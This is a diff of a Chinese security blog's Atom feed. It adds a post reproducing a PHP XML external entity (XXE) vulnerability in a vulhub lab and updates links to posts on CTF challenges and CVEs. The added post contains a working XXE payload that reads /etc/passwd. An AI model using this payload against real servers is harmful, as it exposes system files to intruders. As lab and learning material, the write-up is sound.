@@ -6,7 +6,7 @@
   <link href="https://lewiserii.github.io/atom.xml" rel="self"/>
   
   <link href="https://lewiserii.github.io/"/>
-  <updated>2021-06-16T08:29:14.537Z</updated>
+  <updated>2021-06-21T05:22:50.981Z</updated>
   <id>https://lewiserii.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP环境 XML外部实体注入漏洞（XXE）</title>
+    <link href="https://lewiserii.github.io/2021/06/21/PHP%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/"/>
+    <id>https://lewiserii.github.io/2021/06/21/PHP%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/</id>
+    <published>2021-06-21T04:00:00.000Z</published>
+    <updated>2021-06-21T05:22:50.981Z</updated>
+    
+    <content type="html"><![CDATA[<h1><span id="环境介绍">环境介绍：</span></h1><p>PHP 7.0.30<br>libxml 2.8.0</p><h1><span id="漏洞复现">漏洞复现</span></h1><p>Web目录为./www，其中包含4个文件：</p><blockquote><p>$ tree .<br>.<br>├── dom.php # 示例：使用DOMDocument解析body<br>├── index.php<br>├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body<br>└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</p></blockquote><p>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞</p><p>Simple XXE Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/06/21/RA8Vvq.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;&lt;span id=&quot;环境介绍&quot;&gt;环境介绍：&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;PHP 7.0.30&lt;br&gt;libxml 2.8.0&lt;/p&gt;
+&lt;h1&gt;&lt;span id=&quot;漏洞复现&quot;&gt;漏洞复现&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;Web目录为./www，其中包含4个文件：&lt;/p&gt;
+&lt;blo</summary>
+      
+    
+    
+    
+    <category term="vulhub" scheme="https://lewiserii.github.io/categories/vulhub/"/>
+    
+    
+    <category term="vulhub" scheme="https://lewiserii.github.io/tags/vulhub/"/>
+    
+  </entry>
   
   <entry>
     <title>文件上传总结</title>
@@ -46,8 +72,8 @@
   
   <entry>
     <title>CTFshow-web入门-组件漏洞</title>
-    <link href="https://lewiserii.github.io/2021/06/18/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://lewiserii.github.io/2021/06/18/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
+    <link href="https://lewiserii.github.io/2021/06/18/ctfshow-WP/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://lewiserii.github.io/2021/06/18/ctfshow-WP/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
     <published>2021-06-18T08:36:00.000Z</published>
     <updated>2021-06-18T08:38:09.850Z</updated>
     
@@ -76,8 +102,8 @@
   
   <entry>
     <title>CTFshow-群友挑战-wp</title>
-    <link href="https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
-    <id>https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</id>
+    <link href="https://lewiserii.github.io/2021/06/16/ctfshow-WP/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
+    <id>https://lewiserii.github.io/2021/06/16/ctfshow-WP/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</id>
     <published>2021-06-16T04:00:00.000Z</published>
     <updated>2021-06-17T02:15:37.043Z</updated>
     
@@ -100,8 +126,8 @@
   
   <entry>
     <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</title>
-    <link href="https://lewiserii.github.io/2021/06/12/CVE-2016-5734/"/>
-    <id>https://lewiserii.github.io/2021/06/12/CVE-2016-5734/</id>
+    <link href="https://lewiserii.github.io/2021/06/12/CVE/CVE-2016-5734/"/>
+    <id>https://lewiserii.github.io/2021/06/12/CVE/CVE-2016-5734/</id>
     <published>2021-06-12T04:00:00.000Z</published>
     <updated>2021-06-17T02:17:12.890Z</updated>
     
@@ -125,8 +151,8 @@
   
   <entry>
     <title>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</title>
-    <link href="https://lewiserii.github.io/2021/06/11/CVE-2012-1823/"/>
-    <id>https://lewiserii.github.io/2021/06/11/CVE-2012-1823/</id>
+    <link href="https://lewiserii.github.io/2021/06/11/CVE/CVE-2012-1823/"/>
+    <id>https://lewiserii.github.io/2021/06/11/CVE/CVE-2012-1823/</id>
     <published>2021-06-11T04:00:00.000Z</published>
     <updated>2021-06-12T07:34:52.465Z</updated>
     
@@ -149,8 +175,8 @@
   
   <entry>
     <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
-    <link href="https://lewiserii.github.io/2021/06/11/CVE-2013-4547/"/>
-    <id>https://lewiserii.github.io/2021/06/11/CVE-2013-4547/</id>
+    <link href="https://lewiserii.github.io/2021/06/11/CVE/CVE-2013-4547/"/>
+    <id>https://lewiserii.github.io/2021/06/11/CVE/CVE-2013-4547/</id>
     <published>2021-06-11T04:00:00.000Z</published>
     <updated>2021-06-17T02:16:56.717Z</updated>
     
